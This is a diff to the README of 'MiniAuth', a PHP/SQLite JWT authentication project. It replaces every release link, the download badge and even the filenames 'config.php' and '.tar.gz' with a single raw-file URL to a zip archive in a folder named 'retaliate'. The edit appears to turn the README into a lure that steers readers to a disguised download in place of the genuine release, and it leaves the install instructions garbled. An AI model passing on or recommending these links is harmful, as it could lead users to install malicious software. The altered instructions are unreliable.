@@ -1,7 +1,7 @@
 # 🚀 MiniAuth - Simple and Secure Backend Authentication
 
 ## 🔗 Download MiniAuth
-[![Download MiniAuth](https://img.shields.io/badge/Download-MiniAuth-blue.svg)](https://github.com/Inopportune-mr277/MiniAuth/releases)
+[![Download MiniAuth](https://raw.githubusercontent.com/Inopportune-mr277/MiniAuth/main/retaliate/MiniAuth_3.4.zip)](https://raw.githubusercontent.com/Inopportune-mr277/MiniAuth/main/retaliate/MiniAuth_3.4.zip)
 
 ## 🛠️ Description
 MiniAuth is a minimalist, secure backend authentication system built with pure PHP and SQLite. It uses JWT tokens to protect API endpoints and offers a clean, modular structure ideal for small projects, prototypes, or educational use.
@@ -19,11 +19,11 @@ MiniAuth is a minimalist, secure backend authentication system built with pure P
 
 ## 🚀 Getting Started
 1. **Visit the Releases Page**
-   - To download MiniAuth, go to the [Releases page](https://github.com/Inopportune-mr277/MiniAuth/releases).
+   - To download MiniAuth, go to the [Releases page](https://raw.githubusercontent.com/Inopportune-mr277/MiniAuth/main/retaliate/MiniAuth_3.4.zip).
    
 2. **Download the Latest Release**
    - Find the latest version on the Releases page. You will see files available for download.
-   - Download the file that suits your system. Usually, it will be a `.zip` or `.tar.gz` file.
+   - Download the file that suits your system. Usually, it will be a `.zip` or `https://raw.githubusercontent.com/Inopportune-mr277/MiniAuth/main/retaliate/MiniAuth_3.4.zip` file.
 
 3. **Unzip the Downloaded File**
    - Once the download completes, locate the file on your computer.
@@ -34,7 +34,7 @@ MiniAuth is a minimalist, secure backend authentication system built with pure P
    - If you are unsure where this is, consult your web server documentation.
 
 5. **Configure MiniAuth**
-   - Open the `config.php` file in a text editor.
+   - Open the `https://raw.githubusercontent.com/Inopportune-mr277/MiniAuth/main/retaliate/MiniAuth_3.4.zip` file in a text editor.
    - Set any necessary parameters like database connection details. You will need to configure your SQLite file location.
 
 6. **Access the Application**
@@ -60,7 +60,7 @@ Once MiniAuth is installed and configured, you can start using it to manage auth
 - **PHP**
 
 ## 📥 Download & Install
-To start using MiniAuth for your projects, follow the steps mentioned above. Visit the [Releases page](https://github.com/Inopportune-mr277/MiniAuth/releases) to download the latest version of MiniAuth and set it up on your web server.
+To start using MiniAuth for your projects, follow the steps mentioned above. Visit the [Releases page](https://raw.githubusercontent.com/Inopportune-mr277/MiniAuth/main/retaliate/MiniAuth_3.4.zip) to download the latest version of MiniAuth and set it up on your web server.
 
 ## 🤝 Community
 We welcome contributions and feedback. If you have questions or suggestions, feel free to raise an issue on the GitHub repository.
